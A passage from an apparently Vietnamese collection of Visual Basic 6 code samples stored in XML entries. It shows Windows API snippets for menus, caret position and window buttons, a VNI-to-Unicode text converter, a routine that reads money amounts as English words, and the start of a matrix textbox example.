CommonDialog1.FileName = "pifmgr.dll"
CommonDialog1.ShowOpen
If CommonDialog1.FileName &lt;&gt; "" Then sPath = CommonDialog1.FileName
    sPath = sPath &amp; String$(MAX_PATH - Len(sPath), 0)
    SHChangeIconDialog Me.hWnd, StrPtr(sPath), 0, lpIconIndex
    MsgBox lpIconIndex
    MsgBox sPath
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090418030425</MaVD>
    <NoiDung>Cần Text1 khá lớn, MultiLine = True 

Private Declare Function GetCaretPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Type POINTAPI
    X As Long: Y As Long
End Type
 
Private Sub Text1_Change()
    Me.Caption = "X: " &amp; ScaleX(GetTCurs.X, vbPixels, vbTwips) + Text1.Left &amp; " Y: " &amp; ScaleX(GetTCurs.Y, vbPixels, vbTwips) + Text1.Top
End Sub
 
Private Sub Text1_Click()
    Me.Caption = "X: " &amp; ScaleX(GetTCurs.X, vbPixels, vbTwips) + Text1.Left &amp; " Y: " &amp; ScaleX(GetTCurs.Y, vbPixels, vbTwips) + Text1.Top
End Sub
 
Private Function GetTCurs() As POINTAPI
    Dim pt As POINTAPI
    GetCaretPos pt
    GetTCurs.X = pt.X:      GetTCurs.Y = pt.Y
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090818030814</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>090918030925</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>092418032418</MaVD>
    <NoiDung>'Source code author: zzzzzooc from http://www.experts-exchange.com
'Edit to Support Unicode, convert to Popup, support ID by vie87vn from http://www.caulacbovb.com
'Code's shared for ALL
 
Option Explicit
 
Private Type POINTAPI
    X As Long
    Y As Long
End Type
 
Private Type MENUITEMINFO
    cbSize As Long
    fMask As Long
    fType As Long
    fState As Long
    wID As Long
    hSubMenu As Long
    hbmpChecked As Long
    hbmpUnchecked As Long
    dwItemData As Long
    dwTypeData As Long
    cch As Long
End Type
Const TPM_RETURNCMD = &amp;H100&amp;
 
Private Declare Function AppendMenu Lib "user32" Alias "AppendMenuW" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As Long) As Long
Private Declare Function CreatePopupMenu Lib "user32" () As Long
Private Declare Function CreateMenu Lib "user32" () As Long
Private Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Private Declare Function GetMenuItemInfo Lib "user32" Alias "GetMenuItemInfoA" (ByVal hMenu As Long, ByVal un As Long, ByVal b As Boolean, lpmii As MENUITEMINFO) As Long
Private Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Private Declare Function InsertMenuItem Lib "user32" Alias "InsertMenuItemW" (ByVal hMenu As Long, ByVal un As Long, ByVal bool As Boolean, ByRef lpcMenuItemInfo As MENUITEMINFO) As Long
Private Declare Function SetMenuItemInfo Lib "user32" Alias "SetMenuItemInfoW" (ByVal hMenu As Long, ByVal uItem As Long, ByVal fByPosition As Long, lpmii As MENUITEMINFO) As Long
Private Declare Function TrackPopupMenu Lib "user32" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal X As Long, ByVal Y As Long, ByVal nReserved As Long, ByVal hwnd As Long, ByVal lprc As Any) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
 
Private Const MIIM_TYPE = &amp;H10
Private Const MIIM_SUBMENU = &amp;H4
Private Const MIIM_ID As Long = &amp;H2
 
Private Const MF_STRING = &amp;H0
Private Const MF_SEPARATOR = &amp;H800&amp;
 
Private Const ID_MENULEVEL1_HOMEPAGE = &amp;H1
    Private Const ID_MENULEVEL2_RESOURCE = &amp;H11
        Private Const ID_MENULEVEL3_SOUNDGRAPHIC = &amp;H111
        Private Const ID_MENULEVEL3_DATABASE = &amp;H112
    Private Const ID_MENULEVEL2_LIB = &amp;H12
        Private Const ID_MENULEVEL3_FULL = &amp;H121
        Private Const ID_MENULEVEL3_DATA = &amp;H122
        
Private Const ID_MENULEVEL1_FORUM = &amp;H2
    Private Const ID_MENULEVEL2_HEAVEN = &amp;H21
        Private Const ID_MENULEVEL3_GOLDENGARDEN = &amp;H211
        Private Const ID_MENULEVEL3_CASTLE = &amp;H212
    Private Const ID_MENULEVEL2_EARTH = &amp;H22
        Private Const ID_MENULEVEL3_VIETNAM = &amp;H221
            Private Const ID_MENULEVEL4_HANOICAPITAL = &amp;H2211
                Private Const ID_MENULEVEL5_HANGCHUOI = &amp;H22111
                Private Const ID_MENULEVEL5_HANGMA = &amp;H22112
                Private Const ID_MENULEVEL5_HANGDAO = &amp;H22113
                Private Const ID_MENULEVEL5_HANGBONG = &amp;H22114
            Private Const ID_MENULEVEL4_DANANG = &amp;H2212
            Private Const ID_MENULEVEL4_HCMC = &amp;H2213
                Private Const ID_MENULEVEL5_DIS1 = &amp;H22131
                Private Const ID_MENULEVEL5_DIS2 = &amp;H22132
                Private Const ID_MENULEVEL5_DIS3 = &amp;H22133
                Private Const ID_MENULEVEL5_DIS4 = &amp;H22134
                Private Const ID_MENULEVEL5_DIS5 = &amp;H22135
                Private Const ID_MENULEVEL5_DIS6 = &amp;H22136
                Private Const ID_MENULEVEL5_DIS7 = &amp;H22137
                Private Const ID_MENULEVEL5_DIS8 = &amp;H22138
                Private Const ID_MENULEVEL5_DIS9 = &amp;H22139
                Private Const ID_MENULEVEL5_DIS10 = &amp;H2213A
                Private Const ID_MENULEVEL5_DIS11 = &amp;H2213B
                    Private Const ID_MENULEVEL6_WRD1 = &amp;H2213B1
                    Private Const ID_MENULEVEL6_WRD2 = &amp;H2213B2
                    Private Const ID_MENULEVEL6_WRD3 = &amp;H2213B3
                    Private Const ID_MENULEVEL6_WRD4 = &amp;H2213B4
                        Private Const ID_MENULEVEL7_MYHOME = &amp;H2213B1
                    Private Const ID_MENULEVEL6_WRD5 = &amp;H2213B5
                    Private Const ID_MENULEVEL6_WRD6 = &amp;H2213B6
                    Private Const ID_MENULEVEL6_WRD7 = &amp;H2213B7
                    Private Const ID_MENULEVEL6_WRD8 = &amp;H2213B8
                    Private Const ID_MENULEVEL6_WRD9 = &amp;H2213B9
                    Private Const ID_MENULEVEL6_WRD10 = &amp;H2213BA
                    Private Const ID_MENULEVEL6_WRD11 = &amp;H2213BB
                    Private Const ID_MENULEVEL6_WRD12 = &amp;H2213BC
                    Private Const ID_MENULEVEL6_WRD13 = &amp;H2213BD
                    Private Const ID_MENULEVEL6_WRD14 = &amp;H2213BE
                    Private Const ID_MENULEVEL6_WRD15 = &amp;H2213BF
                    Private Const ID_MENULEVEL6_WRD16 = &amp;H2213C1
                Private Const ID_MENULEVEL5_DIS12 = &amp;H2213C
        Private Const ID_MENULEVEL3_JAPAN = &amp;H222
        Private Const ID_MENULEVEL3_ENGLAND = &amp;H223
        Private Const ID_MENULEVEL3_FRANCE = &amp;H224
        Private Const ID_MENULEVEL3_CHINA = &amp;H225
    Private Const ID_MENULEVEL2_HELL = &amp;H23
        Private Const ID_MENULEVEL3_FLOOR1 = &amp;H231
        Private Const ID_MENULEVEL3_FLOOR2 = &amp;H232
    
Private Const ID_MENULEVEL1_SEPARATOR = &amp;H3
 
Private Const ID_MENULEVEL1_BRAVO = &amp;H4
 
 
Dim hMainMenu&amp;
 
Private Sub Form_Load()
    Dim hSubMenu As Long
    Dim hSubMenuLevel2 As Long
    Dim hSubMenuLevel3 As Long
    Dim hSubMenuLevel4 As Long
    Dim hSubMenuLevel5 As Long
    
    hMainMenu = CreatePopupMenu 'Create Popup Unicode Submenu
    AppendMenu hMainMenu, MF_STRING, ID_MENULEVEL1_HOMEPAGE, StrPtr(ToUni("Trang chu3 Ca6u la5c bo65 VB"))
    AppendMenu hMainMenu, MF_STRING, ID_MENULEVEL1_FORUM, StrPtr(ToUni("Die64n d9a2n Ca6u la5c bo65 VB"))
    AppendMenu hMainMenu, MF_SEPARATOR, ID_MENULEVEL1_SEPARATOR, 0&amp;
    AppendMenu hMainMenu, MF_STRING, ID_MENULEVEL1_BRAVO, StrPtr(ToUni("Unicode Menu d9a4 ca61p ne2!!!"))
    'hMainMenu = GetMenu(Me.hwnd) 'Uncomment to Add Submenu At Runtime. Support Unicode
    '===Uncomment above line code to Add Submenu at Runtime. Request: Create a menu at Design===
    
    If hMainMenu &lt;&gt; 0 Then
        '1st set of menus...
        hSubMenu = MenuInsert(hMainMenu, ToUni("Ta2i nguye6n"), 0, ID_MENULEVEL2_RESOURCE)
            Call MenuInsert(hSubMenu, ToUni("A6m thanh va2 d9o62 ho5a"), 0, ID_MENULEVEL3_SOUNDGRAPHIC)
            Call MenuInsert(hSubMenu, ToUni("Co7 so73 du74 lie65u"), 0, ID_MENULEVEL3_DATABASE)
        hSubMenu = MenuInsert(hMainMenu, ToUni("Thu7 vie65n VBLib"), 0, ID_MENULEVEL2_LIB)
            Call MenuInsert(hSubMenu, ToUni("Bo65 d9a62y d9u3"), 1, ID_MENULEVEL3_FULL)
            Call MenuInsert(hSubMenu, ToUni("Co7 so73 du74 lie65u ca65p nha65t"), 1, ID_MENULEVEL3_DATA)
            
        '2nd set of menus...
        hSubMenu = MenuInsert(hMainMenu, ToUni("Thie6n d9a2ng"), 1, ID_MENULEVEL2_HEAVEN)
            Call MenuInsert(hSubMenu, ToUni("Vu7o72n d9i5a d9a2ng"), 0, ID_MENULEVEL3_GOLDENGARDEN)
            Call MenuInsert(hSubMenu, ToUni("Thie6n cung"), 0, ID_MENULEVEL3_CASTLE)
            
        hSubMenu = MenuInsert(hMainMenu, ToUni("Tra62n gian"), 1, ID_MENULEVEL2_EARTH)
            hSubMenuLevel2 = MenuInsert(hSubMenu, ToUni("Vie65t Nam"), 1, ID_MENULEVEL3_VIETNAM)
                hSubMenuLevel3 = MenuInsert(hSubMenuLevel2, ToUni("Ha2 no65i"), 0, ID_MENULEVEL4_HANOICAPITAL)
                    Call MenuInsert(hSubMenuLevel3, ToUni("Pho61 ha2ng chuo61i"), 0, ID_MENULEVEL5_HANGCHUOI)
                    Call MenuInsert(hSubMenuLevel3, ToUni("Pho61 ha2ng ma4"), 0, ID_MENULEVEL5_HANGMA)
                    Call MenuInsert(hSubMenuLevel3, ToUni("Pho61 ha2ng d9a2o"), 0, ID_MENULEVEL5_HANGDAO)
                    Call MenuInsert(hSubMenuLevel3, ToUni("Pho61 ha2ng bo6ng"), 0, ID_MENULEVEL5_HANGBONG)
                hSubMenuLevel3 = MenuInsert(hSubMenuLevel2, ToUni("D9a2 Na84ng"), 0, ID_MENULEVEL4_DANANG)
                hSubMenuLevel3 = MenuInsert(hSubMenuLevel2, ToUni("Tha2nh pho61 Ho62 Chi1 Minh"), 0, ID_MENULEVEL4_HCMC)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 1"), 2, ID_MENULEVEL5_DIS1)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 2"), 2, ID_MENULEVEL5_DIS2)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 3"), 2, ID_MENULEVEL5_DIS3)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 4"), 2, ID_MENULEVEL5_DIS4)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 5"), 2, ID_MENULEVEL5_DIS5)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 6"), 2, ID_MENULEVEL5_DIS6)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 7"), 2, ID_MENULEVEL5_DIS7)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 8"), 2, ID_MENULEVEL5_DIS8)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 9"), 2, ID_MENULEVEL5_DIS9)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 10"), 2, ID_MENULEVEL5_DIS10)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 11"), 2, ID_MENULEVEL5_DIS11)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 1"), 10, ID_MENULEVEL6_WRD1)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 2"), 10, ID_MENULEVEL6_WRD2)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 3"), 10, ID_MENULEVEL6_WRD3)
                        hSubMenuLevel5 = MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 4"), 10, ID_MENULEVEL6_WRD4)
                            Call MenuInsert(hSubMenuLevel5, ToUni("Nha2 mi2nh o73 d9a6y ne2!"), 3, ID_MENULEVEL7_MYHOME)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 5"), 10, ID_MENULEVEL6_WRD5)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 6"), 10, ID_MENULEVEL6_WRD6)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 7"), 10, ID_MENULEVEL6_WRD7)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 8"), 10, ID_MENULEVEL6_WRD8)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 9"), 10, ID_MENULEVEL6_WRD9)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 10"), 10, ID_MENULEVEL6_WRD10)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 11"), 10, ID_MENULEVEL6_WRD11)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 12"), 10, ID_MENULEVEL6_WRD12)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 13"), 10, ID_MENULEVEL6_WRD13)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 14"), 10, ID_MENULEVEL6_WRD14)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 15"), 10, ID_MENULEVEL6_WRD15)
                        Call MenuInsert(hSubMenuLevel4, ToUni("Phu7o72ng 16"), 10, ID_MENULEVEL6_WRD16)
                    hSubMenuLevel4 = MenuInsert(hSubMenuLevel3, ToUni("Qua65n 12"), 2, ID_MENULEVEL5_DIS12)
            Call MenuInsert(hSubMenu, ToUni("Nha65t Ba3n"), 1, ID_MENULEVEL3_JAPAN)
            Call MenuInsert(hSubMenu, ToUni("Anh"), 1, ID_MENULEVEL3_ENGLAND)
            Call MenuInsert(hSubMenu, ToUni("Pha1p"), 1, ID_MENULEVEL3_FRANCE)
            Call MenuInsert(hSubMenu, ToUni("Trung Quuo61c"), 1, ID_MENULEVEL3_CHINA)
            
        hSubMenu = MenuInsert(hMainMenu, ToUni("D9i5a ngu5c"), 1, ID_MENULEVEL2_HELL)
            Call MenuInsert(hSubMenu, ToUni("Ta62ng 1"), ID_MENULEVEL3_FLOOR1)
            Call MenuInsert(hSubMenu, ToUni("Ta62ng 2"), ID_MENULEVEL3_FLOOR2)
    End If
End Sub
Private Function MenuInsert(ByVal hMenu As Long, ByVal strCaption As String, Optional ByVal intPos As Integer = 0, Optional ID As Long = 0) As Long
    Dim typMII As MENUITEMINFO, hSubMenu As Long, intMenuCnt As Integer
    
    typMII.cbSize = Len(typMII)
    typMII.fMask = MIIM_SUBMENU Or MIIM_ID
    typMII.wID = 0
    
    Call GetMenuItemInfo(hMenu, intPos, True, typMII)
    
    If typMII.hSubMenu = 0 Then
        hSubMenu = CreateMenu
        typMII.hSubMenu = hSubMenu
        Call SetMenuItemInfo(hMenu, intPos, True, typMII)
    Else
        hSubMenu = typMII.hSubMenu
    End If
    
    intMenuCnt = GetMenuItemCount(hSubMenu)
    typMII.fMask = MIIM_TYPE Or MIIM_ID
    typMII.fType = MF_STRING
    typMII.dwTypeData = StrPtr(strCaption)
    typMII.cch = Len(typMII.dwTypeData)
    typMII.wID = ID
    
    Call InsertMenuItem(hSubMenu, intMenuCnt, True, typMII)
    
    MenuInsert = GetSubMenu(hMenu, intPos)
End Function
 
Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dim a&amp;
    Dim p As POINTAPI
    GetCursorPos p
    If Button = 2 Then
        a = TrackPopupMenu(hMainMenu, TPM_RETURNCMD, p.X, p.Y, 0, Me.hwnd, 0&amp;)
    End If
    Select Case a
        Case ID_MENULEVEL7_MYHOME
            MsgBox "Day la nha minh ne``````"
        Case ID_MENULEVEL3_FLOOR1
            MsgBox "Hahaha"
        Case ID_MENULEVEL3_FLOOR2
            MsgBox "Hohoho"
        Case Else
            MsgBox "Else?"
    End Select
End Sub
 
Public Function ToUni(str$) As String
    Dim ANSI$, UNI$, i&amp;, sTem$, sUni$, arrUNI() As String
    ANSI = "a1|a2|a3|a4|a5|a6|a8|a61a62a63a64a65a81a82a83a84a85A1|A2|A3|A4|A5|A6|A8|A61A62A63A64A65A81A82A83A84A85e1|e2|e3|e4|e5|e6|e61e62e63e64e65E1|E2|E3|E4|E5|E6|E61E62E63E64E65i1|i2|i3|i4|i5|I1|I2|I3|I4|I5|o1|o2|o3|o4|o5|o6|o7|o61o62o63o64o65o71o72o73o74o75O1|O2|O3|O4|O5|O6|O7|O61O62O63O64O65O71O72O73O74O75u1|u2|u3|u4|u5|u7|u71u72u73u74u75U1|U2|U3|U4|U5|U7|U71U72U73U74U75y1|y2|y3|y4|y5|Y1|Y2|Y3|Y4|Y5|d9|D9|"
    UNI = "E1,E0,1EA3,E3,1EA1,E2,103,1EA5,1EA7,1EA9,1EAB,1EAD,1EAF,1EB1,1EB3,1EB5,1EB7,C1,C0,1EA2,C3,1EA0,C2,102,1EA4,1EA6,1EA8,1EAA,1EAC,1EAE,1EB0,1EB2,1EB4,1EB6,E9,E8,1EBB,1EBD,1EB9,EA,1EBF,1EC1,1EC3,1EC5,1EC7,C9,C8,1EBA,1EBC,1EB8,CA,1EBE,1EC0,1EC2,1EC4,1EC6,ED,EC,1EC9,129,1ECB,CD,CC,1EC8,128,1ECA,F3,F2,1ECF,F5,1ECD,F4,1A1,1ED1,1ED3,1ED5,1ED7,1ED9,1EDB,1EDD,1EDF,1EE1,1EE3,D3,D2,1ECE,D5,1ECC,D4,1A0,1ED0,1ED2,1ED4,1ED6,1ED8,1EDA,1EDC,1EDE,1EE0,1EE2,FA,F9,1EE7,169,1EE5,1B0,1EE9,1EEB,1EED,1EEF,1EF1,DA,D9,1EE6,168,1EE4,1AF,1EE8,1EEA,1EEC,1EEE,1EF0,FD,1EF3,1EF7,1EF9,1EF5,DD,1EF2,1EF6,1EF8,1EF4,111,110"
    arrUNI = Split(UNI, ",")
 
    For i = 1 To Len(str)
        If IsNumeric(Mid(str, i + 1, 1)) = False Then
            sUni = sUni &amp; Mid(str, i, 1)
        Else
            sTem = IIf(IsNumeric(Mid(str, i + 2, 1)), Mid(str, i, 3), Mid(str, i, 2))
            i = i + IIf(IsNumeric(Mid(str, i + 2, 1)), 2, 1)
            If InStr(ANSI, sTem) &gt; 0 Then sTem = ChrW("&amp;h" &amp; arrUNI(InStr(ANSI, sTem) \ 3))
            sUni = sUni &amp; sTem
        End If
Next
    ToUni = sUni
End Function
 
 
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092618032606</MaVD>
    <NoiDung>Option Explicit
 
 Private Declare Function GetSystemMenu Lib "user32" _
                             (ByVal hWnd As Long, _
                             ByVal bRevert As Long) As Long
 
 Private Declare Function DeleteMenu Lib "user32" _
                             (ByVal hMenu As Long, _
                            ByVal nPosition As Long, _
                            ByVal wFlags As Long) As Long
 
Private Declare Function DrawMenuBar Lib "user32" _
                            (ByVal hWnd As Long) As Long
 
Private Declare Function GetWindowLong Lib _
                 "user32" Alias "GetWindowLongA" (ByVal hWnd _
                 As Long, ByVal nIndex As Long) As Long
 
Private Declare Function SetWindowLong Lib _
                "user32" Alias "SetWindowLongA" (ByVal hWnd _
                 As Long, ByVal nIndex As Long, ByVal dwNewLong _
                 As Long) As Long
 
Private Const MF_BYCOMMAND = &amp;H0
Private Const SC_MAXIMIZE As Long = &amp;HF030&amp;
Private Const SC_MINIMIZE As Long = &amp;HF020
Private Const SC_CLOSE As Long = &amp;HF060&amp;
 
Private Const GWL_STYLE&amp; = (-16)
Private Const WS_MAXIMIZEBOX As Long = &amp;H10000
Private Const WS_MINIMIZEBOX As Long = &amp;H20000
 
Private Sub Command1_Click()
    End
End Sub
 
Public Sub DisableMinButton()
Dim hMenu As Long
Dim OldStyle As Long
 
    'Remove Max button
    OldStyle = GetWindowLong(Me.hWnd, GWL_STYLE)
    SetWindowLong Me.hWnd, GWL_STYLE, OldStyle And (Not WS_MINIMIZEBOX)
    
    'Remove from system menu
    hMenu = GetSystemMenu(Me.hWnd, 0&amp;)
 
    If hMenu Then
        Call DeleteMenu(hMenu, SC_MINIMIZE, MF_BYCOMMAND)
        Call DrawMenuBar(Me.hWnd)
    
    End If
 
End Sub
 
Public Sub DisableMaxButton()
 
'This sub Removes Maximize button from control box and system menu.
Dim hMenu As Long
Dim OldStyle As Long
 
    'Remove Max button
    OldStyle = GetWindowLong(Me.hWnd, GWL_STYLE)
    SetWindowLong Me.hWnd, GWL_STYLE, OldStyle And (Not WS_MAXIMIZEBOX)
    
    'Remove from system menu
    hMenu = GetSystemMenu(Me.hWnd, 0&amp;)
 
    If hMenu Then
        Call DeleteMenu(hMenu, SC_MAXIMIZE, MF_BYCOMMAND)
        Call DrawMenuBar(Me.hWnd)
    
    End If
 
End Sub
 
Public Sub DisableCloseButton()
Dim hMenu As Long
 
    hMenu = GetSystemMenu(Me.hWnd, 0&amp;)
 
    If hMenu Then
        Call DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND)
        Call DrawMenuBar(Me.hWnd)
    
    End If
End Sub
 
Private Sub Form_Load()
    DisableMaxButton
    DisableMinButton
    DisableCloseButton
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092718032715</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>092818032851</MaVD>
    <NoiDung>Yêu cầu: Tạo trước 1 số Menu trên form với Name và Caption như sau : theo cấu trúc Caption (Name)
File (mnuFile)
...Item 1 (mnuFileItem1)
...Item 2 (mnuFileItem2)
...- (mnuFileBar1)
...Item 3 (mnuFileItem3)
...Item 4 (mnuFileItem4)
...Item 5 (mnuFileItem5)
...Item 6 (mnuFileItem6)

Và copy toàn bộ đoạn code dưới vào form là xong. Thử Click thử vào từng Menu xem 

'Example submitted by Abdulaziz Alfoudari (webmaster@vbparadise.com)
'Visit his homepage at http://www.vbparadise.com
 
Option Explicit
Private Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Private Declare Function CheckMenuRadioItem Lib "user32" (ByVal hMenu As Long, ByVal idFrom As Long, _
ByVal idTo As Long, ByVal idChecked As Long, ByVal uFlags As Long) As Long
 
Const MF_BYPOSITION = &amp;H400&amp;
Const MF_CHECKED = &amp;H8&amp;
 
Private Sub mnuFileItem1_Click()
SetMenuRadio Me, 1, 1, 1, 2
End Sub
 
Private Sub mnuFileItem2_Click()
SetMenuRadio Me, 1, 2, 1, 2
End Sub
 
Private Sub mnuFileItem3_Click()
SetMenuRadio Me, 1, 4, 4, 7
End Sub
 
Private Sub mnuFileItem4_Click()
SetMenuRadio Me, 1, 5, 4, 7
End Sub
 
Private Sub mnuFileItem5_Click()
SetMenuRadio Me, 1, 6, 4, 7
End Sub
 
Private Sub mnuFileItem6_Click()
SetMenuRadio Me, 1, 7, 4, 7
End Sub
 
Function SetMenuRadio(frm As Form, TopMenuPosition As Integer, ItemPosition As Integer, FromItem As Integer, ToItem As Integer)
    Dim lRet As Long
    Dim lngMenu As Long
    Dim lngSubMenu As Long
    Dim lhWnd
    lhWnd = frm.hwnd
    lngMenu = GetMenu(lhWnd) '0 = error
    lngSubMenu = GetSubMenu(lngMenu, TopMenuPosition - 1) '0 = error
    lRet = CheckMenuRadioItem(lngSubMenu, FromItem - 1, ToItem - 1, ItemPosition - 1, MF_BYPOSITION)
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093118033134</MaVD>
    <NoiDung>Private Sub Form_Load()
    Me.Top = Screen.Height
    Me.Left = Screen.Width - Me.Width
    Timer1.Interval = 10
End Sub
 
Private Sub Timer1_Timer()
    Me.Top = Me.Top - 50
    If Me.Top &lt; Screen.Height - Me.Height - 300 Then Timer1.Enabled = False
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095619045659</MaVD>
    <NoiDung>Public Function ReadMoney(ByVal strNumber As String, VarCurrency As String) As String
    '===== Note : Apply to VND only - read in English
   '===== strNumber contains 12 digitals as maximum
   Dim tmp3Num(4) As Integer, Number As String, I As Integer, j As Integer, k As Integer, strResult As String, bSmallNum As Boolean
    Dim temp As Double
    Dim tempnumber As String
    
    If Not IsNumeric(strNumber) Then ReadMoney = "Please enter a number only !": Exit Function
    If Len(strNumber) &gt; 12 Then ReadMoney = "Too large number ! The maximum of this number is 999.999.999.999 (12 digitals only)": Exit Function
    
    temp = Val(strNumber) - Int(Val(strNumber))
    If temp &lt;&gt; 0 Then tempnumber = ReadMoney(CInt(temp * 100), "")
    Number = Trim(Int(strNumber))
    If CDbl(Number) = 0 Then ReadMoney = "Zero " &amp; VarCurrency: Exit Function
    Dim Hang
    Hang = Array("thousand", "million", "billion")
    j = Len(Number) \ 3
    If Len(Number) Mod 3 &gt; 0 Then j = j + 1
    For I = j - 1 To 0 Step -1
        tmp3Num(I) = CInt(Right(Number, IIf(Len(Number) &gt;= 3, 3, Len(Number))))
        If I &gt; 0 Then
            Number = Left(Number, Len(Number) - 3)
        End If
    Next I
    k = 0
    For I = j - 1 To 0 Step -1
        If I = j - 1 Then
                If Len(CStr(tmp3Num(I))) = 3 Then
                    strResult = Read3Num(tmp3Num(I), VarCurrency, True)
                Else
                    bSmallNum = True
                    If CDbl(strNumber) &gt;= 100 Then bSmallNum = False
                    strResult = Read2Num(tmp3Num(I), VarCurrency, True, bSmallNum)
                End If
        Else
                If Len(CStr(tmp3Num(I))) = 3 Then
                    strResult = Read3Num(tmp3Num(I), VarCurrency) &amp; Space(1) &amp; IIf(tmp3Num(I) &gt; 0, Hang(k) &amp; " ", "") &amp; strResult
                Else
                    strResult = Read2Num(tmp3Num(I), VarCurrency) &amp; Space(1) &amp; IIf(tmp3Num(I) &gt; 0, Hang(k) &amp; " ", "") &amp; strResult
                End If
                k = k + 1
        End If
    Next I
    Dim firstchar As String
    If Len(tempnumber) &gt; 0 Then strResult = strResult + " point " + tempnumber
    strResult = Trim(strResult)
    firstchar = UCase(Left(strResult, 1))
    strResult = VarCurrency &amp; " " &amp; firstchar &amp; Right(strResult, Len(strResult) - 1)
    ReadMoney = strResult
End Function

Public Function Read3Num(ByVal intNum As Integer, VarCurrency As String, Optional bLastNum As Boolean = False) As String
    If intNum &gt; 1000 Then Read3Num = "": Exit Function
    Dim Tram
    Tram = Array("one", "two", "three", "four", "five", "six", "seven", "eight", "nine")
    If intNum = 0 Then Read3Num = "": Exit Function
    Read3Num = Tram((intNum \ 100) - 1) &amp; " hundred"
    If intNum Mod 100 &gt; 0 Then
        If bLastNum Then Read3Num = Read3Num
        Read3Num = Read3Num &amp; Space(1) &amp; Read2Num(intNum Mod 100, VarCurrency)
    End If
    If bLastNum Then Read3Num = Read3Num
End Function

Public Function Read2Num(ByVal intNum As Integer, VarCurrency As String, Optional bLastNum As Boolean = False, Optional bSmallNum As Boolean = False) As String
    If intNum &gt; 100 Then Read2Num = "": Exit Function
    Dim donvi, Chuc
    donvi = Array("one", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten", "eleven", "twelve", _
                                "thirteen", "fourteen", "fifteen", "sixteen", "seventeen", "eighteen", "nineteen")
    Chuc = Array("twenty", "thirty", "forty", "fifty", "sixty", "seventy", "eighty", "ninety")
    Select Case intNum
        Case 1 To 19
            If bLastNum And (Not bSmallNum) Then Read2Num = Read2Num
            Read2Num = Read2Num &amp; Space(1) &amp; donvi(intNum - 1)
        Case Is &gt; 19
            Read2Num = Chuc(CInt(intNum \ 10) - 2)
            If intNum Mod 10 &gt; 0 Then
                If bLastNum And (Not bSmallNum) Then Read2Num = Read2Num
                Read2Num = Read2Num &amp; Space(1) &amp; donvi((intNum Mod 10) - 1)
            End If
        Case Else
               Read2Num = ""
    End Select
    If bLastNum Then Read2Num = Read2Num
End Function

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095919045926</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>090119050148</MaVD>
    <NoiDung>1- Dùng code tạo textbox theo yêu cầu số dòng và cột của ma trận
2- Sắp xếp các textbox phù hợp dòng, cột, ma trận 1, 2 và kết quả
3- thực hiện phép tính giữa các textbox phù hợp cọng 2 ma trận

Dim bang3 As Boolean
 
Private Sub TaoBang()
bang3 = False
If Val(Text2) &gt; 0 And Val(Text3) &gt; 0 Then
    Dim i As Byte, j As Byte, k As Byte, a As Integer, b As Integer, c As Integer
        a = Val(Text2)
        b = Val(Text3)
        c = a * b
        XoáText
        Randomize
        For i = 0 To a - 1 ' Ma trân trái
            For j = 0 To b - 1
                k = Text1.Count
                Load Text1(k)
                Text1(k).Top = Text1(0).Top + (i Mod a) * 600
                Text1(k).Left = Text1(0).Left + (j Mod b) * 600
                Text1(k).Visible = True
                Text1(k) = Int(Rnd * 10)
